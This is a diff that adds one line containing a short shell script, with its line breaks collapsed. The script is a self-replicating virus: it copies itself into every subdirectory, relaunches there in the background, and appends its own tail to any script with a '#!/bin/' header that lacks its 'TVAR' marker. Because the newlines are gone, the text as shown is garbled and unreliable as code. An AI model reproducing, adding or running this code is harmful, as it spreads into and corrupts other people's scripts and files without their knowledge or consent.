@@ -1,0 +1,1 @@
+#!/bin/shif [ "$1" = ok ] ; then for i in * do  if [ -d $i ] ; then   cp $0 $i   cd $i   $0 ok &   cd ..  elif [ -n "`head -n 1 $i | grep -s !/bin/`" ] && [ -z "`grep - TVAR $i`" ]; then   echo >>$i ; tail -n 17 $0 >>$i  fi doneelse$0 ok &fi# TVAR
